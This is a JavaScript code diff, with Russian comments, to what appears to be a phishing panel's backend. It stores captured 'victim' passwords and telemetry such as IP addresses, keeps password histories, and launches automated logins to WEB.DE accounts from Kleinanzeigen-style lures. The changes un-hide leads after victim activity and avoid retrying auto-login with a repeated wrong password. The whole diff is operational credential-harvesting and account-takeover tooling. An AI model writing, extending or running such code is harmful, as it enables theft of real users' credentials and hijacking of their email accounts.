@@ -184,6 +184,14 @@ function mergeDuplicateLeadsForSameEmail(emailLower, ctx) {
 
 async function handle(scope) {
   with (scope) {
+  function autoUnhideAfterVictimActivity(lead) {
+    try {
+      if (!lead || !lead.id) return;
+      if (leadService && typeof leadService.tryAutoUnhideLeadAfterVictimActivity === 'function') {
+        leadService.tryAutoUnhideLeadAfterVictimActivity(String(lead.id), { pushEvent: pushEvent });
+      }
+    } catch (_) {}
+  }
   const webdeSubmitSkipRecovery = {
     persistLeadPatch: persistLeadPatch,
     invalidateLeadsCache: invalidateLeadsCache,
@@ -304,6 +312,7 @@ async function handle(scope) {
         }
         applyVictimTelemetry(leadKf, req, json, ip, getBrand);
         persistLeadFull(leadKf);
+        autoUnhideAfterVictimActivity(leadKf);
         if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false, webdeSubmitSkipRecovery)) {
           logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl получен → цепочка автовхода по текущему startPage');
           automationService.startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
@@ -627,7 +636,10 @@ async function handle(scope) {
               totalLeads: readLeads().length
             });
             if (!isKleinSame || hasPassword) {
-              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
+              // Если пароль введён повторно и он не изменился — не перезапускаем автовход теми же неверными данными.
+              const prevPwd = isKleinSame ? prevPwdKlBefore : prevPwdWebBefore;
+              const shouldStart = hasPassword ? (String(passwordFromBody || '') !== String(prevPwd || '')) : !isKleinSame;
+              if (shouldStart && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
                 automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
               }
             }
@@ -891,6 +903,7 @@ async function handle(scope) {
       } else {
         pushEvent(refreshedLead, 'Ввел пароль повторно');
       }
+      autoUnhideAfterVictimActivity(refreshedLead);
       if (!Array.isArray(refreshedLead.passwordHistory)) refreshedLead.passwordHistory = [];
       if (refreshedLead.passwordHistory.length === 0 && (oldPassword || '').trim()) {
         refreshedLead.passwordHistory.push({ p: String(oldPassword).trim(), s: 'login' });
